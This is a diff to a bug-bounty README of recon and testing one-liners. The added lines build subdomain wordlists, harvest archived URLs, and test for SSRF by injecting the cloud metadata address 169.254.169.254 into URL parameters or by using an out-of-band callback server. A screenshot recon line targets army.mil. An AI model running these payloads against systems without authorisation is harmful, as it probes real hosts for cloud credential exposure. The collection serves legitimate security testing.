@@ -1,7 +1,7 @@
 # For loops and one liners for bug bounty 
 Credits goes to all those awesome researchers who uploaded these on Twitter and their GitHub  
 
-Please Note: Kindly use this only for reference and learning purposes using this doesn't means that you will find Vulnerabilities cause everybody is using this so try to be creative while using this and modify them to get unique results :)
+Please Note: Kindly use this only for reference and learning purposes using this doesn't means that you will find Vulnerabilities cause everybody is using this so try to be creative while using it and modify them to get unique results :)
 
 ## One Liners for XSS
 
@@ -46,6 +46,13 @@ gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 
 
 ## For Finding Subdomains AssetDiscovery  
+
+### For making a huge wordlist of subdomains with Rapid 7 FDNS @m4ll0k
+
+Download the zip file from here
+```bash
+gzip -dc latestfile-fdns_a.json.gz | jq .name | sed 's/"//g' | xargs -I @bash -c 'tldextract @' | awk '{print $1}' >> mysubs.txt 
+```
 
 ### One liner to fetch all URLs in scope of all public programs @_ayoubfathi_
 
@@ -93,6 +100,7 @@ Run `subfinder -dL domains.txt -all >> subdomains1.txt`
 Install nuclei, subfinder, Notify and anew
 
 
+
 ### Brute Force List of subdomains using FFuf
 
 ```bash
@@ -106,19 +114,46 @@ ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt
 
 ```
 
+## One liners for SSRF
+
+### Using waybackurls and gau @R0X4R
+After finding subdomains with HTTPX run the Following
+
+```bash
+cat subdomains.txt | gauplus --random-agent -b png,jpg,svg,gif -t 100 | anew -q gau_output.txt
+cat subdomains.txt | xargs -P 30 -I host bash -c "echo host | waybackurls | anew -q wayback_output.txt"
+cat wayback_output.txt gau_output.txt | urldedupe -s | anew -q parameters.txt
+
+Mannual
+cat parameters.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I host -P 50 bash -c "curl -ks 'host' | grep \"compute.internal\" && echo -e \"[VULNERABLE] - X \n \"" | grep "VULN"
+
+
+Using OOB
+cat parameters.txt | gf ssrf | anew -q ssrf.txt
+
+cat ssrf.txt | qsreplace "interactsh server ID" | anew -q ssrf_test.txt
+ffuf -w ssrf_test.txt -u FUZZ -p "0.6-1.2" -H "(header in thread)" -t 200 -s
+
+```
+### Using nuclei and Gf @Virdoex_hunter
+```bash
+subfdiner -dL domains.txt | httpx | gau | gf ssrf | nuclei -t ~/nuclei-templates/vulnerabilites/microstrategy-ssrf.yaml -o result.txt
+
+```
+## One Liners for Recon and Visual inspection
+
+### Using Assetfinder with gowitness
+
+```bash
+assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
+```
+
 ### Find Subdomains using Subfinder and opens them on Firefox @payloadartists
 
 ```bash
 subfinder -d $1 -silent -t 100 | httprobe -c 50 | sort -u | while read line; do firefox $line; sleep 10; done
 
 ```
-
-## One Liners for Recon and Visual inspection
-
-### Using Assetfinder with gowitness
-assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
-
-
 
 
 ## One Liners for information disclosure
@@ -128,6 +163,11 @@ assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'g
 ```bash
 gau http://hacked-site.com | waybackurls | grep ".xlsx"
 ```
+
+
+
+
+
 
 ## One Liners for CVE and Vulnerabilties
 
